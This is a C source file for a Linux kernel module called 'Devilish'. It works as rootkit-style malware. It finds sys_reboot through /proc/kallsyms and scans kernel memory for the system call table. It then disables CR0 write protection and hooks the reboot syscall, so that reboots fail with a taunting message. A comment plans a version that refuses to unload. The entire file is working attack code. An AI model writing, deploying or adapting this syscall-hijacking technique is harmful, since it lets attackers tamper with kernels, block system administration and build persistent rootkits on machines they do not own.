#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/slab.h>		// Kernel slab allocation, kmalloc()
#include <linux/fs.h>		// File operation functions in kernel mode
#include <linux/uaccess.h>	// Needed for unpriveleged memory access
#include <linux/string.h>	// We need this for sane string manipulation
#include <linux/syscalls.h>	// System calls
#include <linux/types.h>	// Just to get ULLONG_MAX
#include <linux/linkage.h>	// Asmlinkage exports

#include <asm/paravirt.h>	// Functions to modify the CPU control register
#include <asm/page.h>		// Exports PAGE_OFFSET
#include <asm/unistd.h>		// System call identification numbers

#ifndef MODULE_NAME
#define MODULE_NAME "Devilish"
#endif
#define MAX_LEN 256
#define SYMBOLS "/proc/kallsyms"

/* We should have an author. */
MODULE_AUTHOR("Hackerman");
/* We don't want to taint the kernel. */
MODULE_LICENSE("Dual MIT/GPL");

unsigned long *sys_reboot_address;
unsigned long **sct = NULL;

asmlinkage long (* orig_reboot) (int, int);

asmlinkage long new_reboot(int a0, int a1)
{
	printk(KERN_EMERG "You got hacked, son\n");
	return -EPERM;
}

static int find_address_sct(void)
{
	/*
	 * Dynamically acquire the kernel RAM base address, could start from 0
	 * as well, but this skips potential wasted reads
	 */
	unsigned long offset = PAGE_OFFSET;

	printk(KERN_INFO "sys_reboot_address = %p\n", sys_reboot_address);
	printk(KERN_INFO "looking for sct address\n");
	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		/* Pretend we have the syscall table and prod for address */
		if (sct[__NR_reboot] == sys_reboot_address) {
			/* We actually have it */
			printk(KERN_INFO "found sct[__NR_reboot]");
			return 0;
		}

		/* Increment the iterator with the size of one 'address' */
		offset += sizeof(void *);
	}

	/*
	 * We couldn't find it. If we didn't find it the function takes ages to
	 * complete anyways.
	 */
	return -1;
}

static int find_address_reboot(void)
{
	/*
	 * Open /proc/kallsyms which contains all of the 'publicly' available
	 * symbols. Search for the address of the desired syscall.
	 */
	struct file *fp = NULL;
	int i = 0;
	char buf[MAX_LEN];
	char *ptr;
	char *tmp;
	mm_segment_t fs_state;

	fs_state = get_fs();
	set_fs(KERNEL_DS);

	fp = filp_open(SYMBOLS, O_RDONLY, 0);
	if (fp == NULL)
		return -1;

	memset(buf, 0x0, MAX_LEN);
	ptr = buf;

	/*
	 * The contents of kallsyms <address> <symbol type> <symbol name>
	 * Example: ffffffffba09ef60 T add_range
	 * 'T/t' = text/code
	 */
	while(kernel_read(fp, ptr+i, 1, &fp->f_pos) == 1) {
		if (ptr[i] == '\n' || i == 255) {
			i = 0;
			if ((strstr(ptr, "sys_reboot") != NULL)) {
				printk(KERN_INFO "ptr = %s\n", ptr);

				tmp = kzalloc(MAX_LEN, GFP_KERNEL);
				if (tmp == NULL) {
					kfree(tmp);
					filp_close(fp, 0);
					set_fs(fs_state);
					return -1;
				}
				/* Separate the address field from the string */
				strncpy(tmp, strsep(&ptr, " "), MAX_LEN);
				sys_reboot_address = (unsigned long *)
						simple_strtoul(tmp, NULL, 16);
				kfree(tmp);
				break;
			}
			memset(buf, 0x0, MAX_LEN);
			continue;
		}
		i++;
	}

	filp_close(fp, 0);
	set_fs(fs_state);
	return 0;
}

static int assign_hook(unsigned long **sct)
{
	/*
	 * Modify the control register (cr0) value to permit writes to protected
	 * memory. Save original function so we can reset when we clean up
	 */
	write_cr0(read_cr0() & (~ 0x10000));
	orig_reboot = (void *) sct[__NR_reboot];
	sct[__NR_reboot] = (long *) new_reboot;
	write_cr0(read_cr0() | 0x10000);
	return 0;
}

static int unassign_hook(void) {
	/*
	 * Since we are nice people we clean up our mess when exiting.
	 * TODO: Version of the module that refuses to unload.
	 */
	write_cr0(read_cr0() & (~ 0x10000));
	sct[__NR_reboot] = (void *) orig_reboot;
	write_cr0(read_cr0() | 0x10000);
	return 0;
}

static int __init loader(void)
{

	printk(KERN_EMERG "Loading %s\n", MODULE_NAME);
	if (find_address_reboot() < 0)
		return -EIO;
	if (find_address_sct() < 0) {
		printk(KERN_INFO "Failed to retrieve sct\n");
		return -EIO;
	} else {
		printk(KERN_INFO "System call table found!\n");
		assign_hook(sct);
		printk(KERN_EMERG "Loaded %s successfully\n", MODULE_NAME);
	}
	return 0;
}

static void __exit reset(void)
{
	unassign_hook();
	printk(KERN_INFO "Unloaded %s\n", MODULE_NAME);
}

module_init(loader);
module_exit(reset);
